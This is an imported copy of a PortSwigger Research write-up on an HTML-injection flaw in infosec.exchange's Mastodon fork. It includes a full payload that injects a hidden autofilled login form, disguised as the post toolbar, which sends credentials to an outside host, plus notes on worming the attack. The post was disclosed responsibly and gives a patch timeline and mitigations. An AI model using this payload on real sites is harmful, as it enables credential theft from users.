---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-11-15_stealing-passwords-from-infosec-mastodon-without-bypassing-csp.md
original_filename: 2022-11-15_stealing-passwords-from-infosec-mastodon-without-bypassing-csp.md
title: Stealing passwords from infosec Mastodon - without bypassing CSP
category: notes
detected_topics:
- xss
- ssrf
- csrf
- sqli
- command-injection
- file-upload
tags:
- imported
- notes
- xss
- ssrf
- csrf
- sqli
- command-injection
- file-upload
language: en
raw_sha256: 9771a0a4256ed7b9d5dd42b60ecae88f6b871cf3de2ae7b40b052a5208449847
text_sha256: 5b90894a3110440151c10794d0fe17e84850e8c22452df95b446eb9388f9016f
ingested_at: '2026-06-28T07:32:15Z'
sensitivity: unknown
redactions_applied: false
---

# Stealing passwords from infosec Mastodon - without bypassing CSP

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-11-15_stealing-passwords-from-infosec-mastodon-without-bypassing-csp.md
- Source Type: markdown
- Detected Topics: xss, ssrf, csrf, sqli, command-injection, file-upload
- Ingested At: 2026-06-28T07:32:15Z
- Redactions Applied: False
- Raw SHA256: `9771a0a4256ed7b9d5dd42b60ecae88f6b871cf3de2ae7b40b052a5208449847`
- Text SHA256: `5b90894a3110440151c10794d0fe17e84850e8c22452df95b446eb9388f9016f`


## Content

---
title: "Stealing passwords from infosec Mastodon - without bypassing CSP"
page_title: "Stealing passwords from infosec Mastodon - without bypassing CSP | PortSwigger Research"
url: "https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp"
final_url: "https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp"
authors: ["Gareth Heyes (@garethheyes)"]
programs: ["Mastodon", "infosec.exchange"]
bugs: ["HTML injection"]
publication_date: "2022-11-15"
added_date: "2022-11-17"
source: "pentester.land/writeups.json"
original_index: 1910
---

[](/)

[Login](/users)

Products Solutions [Research](/research) [Academy](/web-security) Support Company

[Customers](/customers) [About](/about) [Blog](/blog) [Careers](/careers) [Legal](/legal) [Contact](/contact) [Resellers](/support/reseller-faqs)

[My account](/users/youraccount) [Customers](/customers) [About](/about) [Blog](/blog) [Careers](/careers) [Legal](/legal) [Contact](/contact) [Resellers](/support/reseller-faqs)

[ ![Burp Suite DAST](/content/images/svg/icons/enterprise.svg) **Burp Suite DAST** The enterprise-enabled dynamic web vulnerability scanner. ](/burp/enterprise) [ ![Burp Suite Professional](/content/images/svg/icons/professional.svg) **Burp Suite Professional** The world's #1 web penetration testing toolkit. ](/burp/pro) [ ![Burp Suite Community Edition](/content/images/svg/icons/community.svg) **Burp Suite Community Edition** The best manual tools to start web security testing. ](/burp/communitydownload) [View all product editions](/burp)

[ **Burp Scanner** Burp Suite's web vulnerability scanner ![Burp Suite's web vulnerability scanner'](/mega-nav/images/burp-suite-scanner.jpg) ](/burp/vulnerability-scanner)

[ **Attack surface visibility** Improve security posture, prioritize manual testing, free up time. ](/solutions/attack-surface-visibility) [ **CI-driven scanning** More proactive security - find and fix vulnerabilities earlier. ](/solutions/ci-driven-scanning) [ **Application security testing** See how our software enables the world to secure the web. ](/solutions) [ **DevSecOps** Catch critical bugs; ship more secure software, more quickly. ](/solutions/devsecops) [ **Penetration testing** Accelerate penetration testing - find more bugs, more quickly. ](/solutions/penetration-testing) [ **Automated scanning** Scale dynamic scanning. Reduce risk. Save time/money. ](/solutions/automated-security-testing) [ **Bug bounty hunting** Level up your hacking and earn more bug bounties. ](/solutions/bug-bounty-hunting) [ **Compliance** Enhance security monitoring to comply with confidence. ](/solutions/compliance)

[View all solutions](/solutions)

[ **Product comparison** What's the difference between Pro and DAST? ![Burp Suite Professional vs Burp Suite DAST](/mega-nav/images/burp-suite.jpg) ](/burp/dast/resources/dast-vs-professional)

[ **Support Center** Get help and advice from our experts on all things Burp. ](/support) [ **Documentation** Tutorials and guides for Burp Suite. ](/burp/documentation) [ **Get Started - Professional** Get started with Burp Suite Professional. ](/burp/documentation/desktop/getting-started) [ **Get Started - DAST** Get started with Burp Suite DAST. ](/burp/documentation/dast/getting-started) [ **Downloads** Download the latest version of Burp Suite. ](/burp/releases)

[Visit the Support Center](/support)

[ **Downloads** Download the latest version of Burp Suite. ![The latest version of Burp Suite software for download](/mega-nav/images/latest-burp-suite-software-download.jpg) ](/burp/releases)

Articles

  * [Overview](/research)
  * Core Topics

[Black Hat](/research/black-hat) [XSS](/research/cross-site-scripting-research) [Request Smuggling](/research/request-smuggling) [Template Injection](/research/template-injection) [Top 10 Hacking Techniques](/research/top-10-web-hacking-techniques)

  * [Articles](/research/articles)
  * Meet the Researchers

[James Kettle](/research/james-kettle) [Gareth Heyes](/research/gareth-heyes) [Zakhar Fedotkin](/research/zakhar-fedotkin)

  * [Talks](/research/talks)
  * [ RSS  ](/research/rss)

# Stealing passwords from infosec Mastodon - without bypassing CSP

  * [ ](https://twitter.com/share?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fstealing-passwords-from-infosec-mastodon-without-bypassing-csp&text=Stealing+passwords+from+infosec+Mastodon+-+without+bypassing+CSP%20-%20%40PortSwiggerRes%0A)
  * [ ](https://api.whatsapp.com/send?text=https%3A%2F%2Fportswigger.net%2Fresearch%2Fstealing-passwords-from-infosec-mastodon-without-bypassing-csp)
  * [ ](https://reddit.com/submit?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fstealing-passwords-from-infosec-mastodon-without-bypassing-csp)
  * [ ](https://www.linkedin.com/sharing/share-offsite?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fstealing-passwords-from-infosec-mastodon-without-bypassing-csp)
  * [ ](mailto:?subject=Stealing+passwords+from+infosec+Mastodon+-+without+bypassing+CSP&body=Stealing+passwords+from+infosec+Mastodon+-+without+bypassing+CSP%0A%0AThe+story+of+how+I+could+steal+credentials+on+Infosec+Mastodon+with+a+HTML+injection+vulnerability%2C+without+needing+to+bypass+CSP.+Everybody+on+our+Twitter+feed+seemed+to+be+jumping+ship+to+the+infose%0A%0Ahttps://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp)
  * [ ](/research/rss)

![Gareth Heyes](/content/images/profiles/callout_gareth_heyes_114px.png)

### [Gareth Heyes](/research/gareth-heyes)

Researcher

[@garethheyes](https://twitter.com/garethheyes)

  * **Published:** Tuesday, 15 November 2022 at 14:00 UTC

  * **Updated:** Wednesday, 16 November 2022 at 11:49 UTC

  * 

![Recording that shows click a fake Mastodon toolbar to demonstrate a HTML injection vulnerability that enables you to steal credentials](/cms/images/67/14/41c9-article-mastodon-steal-passwords.gif)

**The story of how I could steal credentials on Infosec Mastodon with a HTML injection vulnerability, without needing to bypass[CSP](/web-security/cross-site-scripting/content-security-policy).**

Everybody on our Twitter feed seemed to be jumping ship to the [infosec.exchange](https://infosec.exchange/) Mastodon server, so I decided to see what the fuss was all about. After figuring out why exactly you had to have loads of @ symbols in your username, I began to have a look at how secure it was. If you've followed me on Twitter you'll know I like to post vectors and test the limits of the app I'm using, and today was no exception. 

First, I began testing to see if HTML or Markdown was supported. I did a couple of "tweets" to see if you could have code blocks (how cool would that be?) but nothing seemed to work. That is, until [@ret2bed](https://infosec.exchange/@ret2bed) pointed out that you could change your preferences to enable HTML! That's right people, a social network that enables you to post HTML - what could possibly go wrong?

I enabled this handy preference and redid my tests. Markdown seemed pretty limited. I was mainly hoping for code blocks but they didn't materialise. I switched to testing HTML and tested for basic stuff like bold tags, which seemed to work on the web but not on mobile. Whilst I was testing, [@securitymb](https://infosec.exchange/@securitymb) gave me a link to their HTML filter [source code](https://github.com/glitch-soc/mastodon/blob/main/lib/sanitize_ext/sanitize_config.rb) and he showed me a very interesting vector where they were decoding entities.

This gave me the feeling that this platform's HTML filter wasn't the best. I studied the source code and found that it supported a few different attributes. What looked promising was the "title" attribute, maybe I could embed tags in there and break out of it? I did a private "tweet" to see if it worked:

Input:

`<abbr title="<img src=1 onerror=alert(1)>">test</abbr>`

Output:

`<abbr title="<img src=1 onerror=alert(1)>">test</abbr>`

The content of the attribute was retained as is. This was great. It gave me a payload to use if I figured a way to break out of the attribute! Using the abbr tag I looked for single and double quotes, both of which were supported - although it seemed single quotes were converted to double quotes, I also tried quoteless attributes but they seemed to be removed. After many different private "tweets", I couldn't find a way to break out of the attribute.

I noticed a couple of people had a verified ![Verified icon](/cms/images/9d/ac/2510-article-verified.png) icon in their name and after asking some questions to the very helpful community, I discovered that if you use the text :verified: it would be replaced with an icon.

Input: 

`:verified:`

Output:

`<img draggable="false" class="emojione custom-emoji" alt=":verified:" … >`

The icon was an img tag and it had quotes, maybe I could use that? I placed the `:verified:` string inside a anchor text node that was inside the title attribute:

Input:

`<abbr title="<a href='https://blah'>:verified:</a><iframe src=//garethheyes.co.uk/>">`

Output:

`<abbr title="<a href='https://blah</a>'><img draggable=" false" ... ><iframe src=//garethheyes.co.uk/>`

To my surprise, it worked! I inspected the HTML with devtools - from here I could see that the rendered iframe, and my site, loaded when viewing the "tweet" thanks to a lax frame-src directive that allows any https: URL.

The filter was completely destroyed as I could just inject arbitrary HTML, but one last thing stood in my way: they used a relatively strict [Content Security Policy](https://portswigger.net/web-security/cross-site-scripting/content-security-policy). Pretty much each resource was limited to infosec.exchange, with the exception of iframes which allowed any HTTPS URL.

I tried file uploads and fuzzed content types to see if modern browsers [allow images to be rendered as script](https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs) \- they don't seem to now. I spent the next morning looking for ways to bypass the policy or look for gadgets.

I ran out of time for the CSP bypass however, [@albinowax](https://infosec.exchange/@albinowax) suggested I try to steal passwords using forms. Of course you could inject form elements, so I pointed a form at portswigger-labs.net and tested to see if the form submission worked. It did, so I can spoof the login form. 

My next test was with Chrome autofill - would the password get filled in automatically by Chrome? Of course it would, and without any user interaction! Now I had the password, and I could create a convincing button to click, so I showed James. He had a pretty evil thought - thank goodness he's not actually evil - what if you spoofed the toolbar below the "tweet"? I spoofed the toolbar quite easily but the inputs with the username and password were visible which made it less convincing.

Almost there now … I tested Chrome to see if it would still autofill the credentials when the inputs were invisible. If you used an opacity value of zero, Chrome would still conveniently fill in the credentials. But wait - I can't use inline styles because of the CSP. I looked at the CSS files hoping to find a class that had opacity:0 and found one in a couple of seconds. I applied the class to the inputs and it worked perfectly:

`<abbr title="<a href='https://blah'>:verified:</a></abbr>  
<form action=//portswigger-labs.net/mastodon-demo>  
<input name=username class=react-toggle-track-check>  
<input type=password name=password class=react-toggle-track-check>  
  
<div class='status__action-bar'><button type=submit aria-label='Reply' title='Reply' class='status__action-bar-button icon-button' tabindex='0'>  
<i role='img' class='fa fa-reply fa-fw' aria-hidden='true'></i>  
</button>  
<button type=submit aria-label='Boost' aria-pressed='false' title='Boost' class='status__action-bar-button icon-button' tabindex='0' ><i role='img' class='fa fa-retweet fa-fw' aria-hidden='true'></i>  
</button><button type=submit aria-label='Favourite' aria-pressed='false' title='Favourite' class='status__action-bar-button star-icon icon-button' tabindex='0'><i role='img' class='fa fa-star fa-fw' aria-hidden='true'></i>  
</button><button type=submit aria-label='Bookmark' aria-pressed='false' title='Bookmark' class='status__action-bar-button bookmark-icon icon-button' tabindex='0'>  
<i role='img' class='fa fa-bookmark fa-fw' aria-hidden='true'></i> </button>  
<div class='status__action-bar-dropdown'><button type=submit aria-label='Menu' title='Menu' class='icon-button' tabindex='0'><i role='img' class='fa fa-ellipsis-h fa-fw' aria-hidden='true'></i> </button></div>  
</div>  
">`

This attack could easily be wormable, by collecting credentials and re-posting the vector for each user.

If you'd like to try out a similar exploit for yourself, try our lab on [stealing passwords from autofill](https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-capture-passwords).

## Conclusion

We reported this vulnerability to Mastodon, who initially suggested the flaw may be specific to the [Glitch fork](https://github.com/glitch-soc/mastodon) used by infosec.exchange. However, they then released Mastodon 4.0.1, 3.5.5, and 3.4.10 to mitigate the issue. After discussing this with the Glitch developer, core Mastodon was not vulnerable to this particular attack since they do not allow title attributes. It was still patched to fix replacement of placeholders such as :verified:.

This was a great insight into how modern browser mitigations can prevent some attacks on real world apps. However, it also highlights how these mitigations can be sidestepped and still result in credential theft. The form-action directive could prevent these sorts of attacks, and user interaction when filling in passwords is also a good idea. Don't forget to follow [@gaz@infosec.exchange](https://infosec.exchange/@gaz) and [@albinowax@infosec.exchange](https://infosec.exchange/@albinowax), and make sure to switch on two factor authentication. We promise not to steal your password. We look forward to watching how the Twitter and Mastodon battle ends. For now, we will be posting on both platforms.

## Timeline

Tue, 8 Nov, 18:38 - Reported HTML filter bypass to Mastodon  
Tue, 8 Nov, 19:47 - Report acknowledged  
Thu, 10 Nov, ​​07:37 - Glitch patched  
Mon, 14 Nov, 19:48 - Mastodon patched  
Tue, 15 Nov, 08:00 - Confirmed infosec.exchange had applied the patch  
Tue, 15 Nov, 14:00 - Blog published

[ csp ](/research/csp) [ HTML filter bypass ](/research/html-filter-bypass) [ Twitter ](/research/twitter) [ Mastodon ](/research/mastodon)

[Back to all articles](/research/articles)

## Related Research

### [ Using form hijacking to bypass CSP 05 March 2024 Using form hijacking to bypass CSP ](/research/using-form-hijacking-to-bypass-csp) ### [ Bypassing CSP via DOM clobbering 05 June 2023 Bypassing CSP via DOM clobbering ](/research/bypassing-csp-via-dom-clobbering) ### [ Ambushed by AngularJS: a hidden CSP bypass in Piwik PRO 28 April 2023 Ambushed by AngularJS: a hidden CSP bypass in Piwik PRO ](/research/ambushed-by-angularjs-a-hidden-csp-bypass-in-piwik-pro) ### [ Bypassing CSP with dangling iframes 14 June 2022 Bypassing CSP with dangling iframes ](/research/bypassing-csp-with-dangling-iframes)

Burp Suite

[Web vulnerability scanner](/burp/vulnerability-scanner) [Burp Suite Editions](/burp) [Release Notes](/burp/releases)

Vulnerabilities

[Cross-site scripting (XSS)](/web-security/cross-site-scripting) [SQL injection](/web-security/sql-injection) [Cross-site request forgery](/web-security/csrf) [XML external entity injection](/web-security/xxe) [Directory traversal](/web-security/file-path-traversal) [Server-side request forgery](/web-security/ssrf)

Customers

[Organizations](/organizations) [Testers](/testers) [Developers](/developers)

Company

[About](/about) [Careers](/careers) [Contact](/about/contact) [Legal](/legal) [Privacy Notice](/privacy) [Modern Slavery Statement](/modern-slavery-statement)

Insights

[Web Security Academy](/web-security) [Blog](/blog) [Research](/research) [Engineering](/engineering)

[![PortSwigger Logo](/content/images/logos/portswigger-logo.svg)](/) [ Follow us](https://twitter.com/Burp_Suite)

© 2026 PortSwigger Ltd.
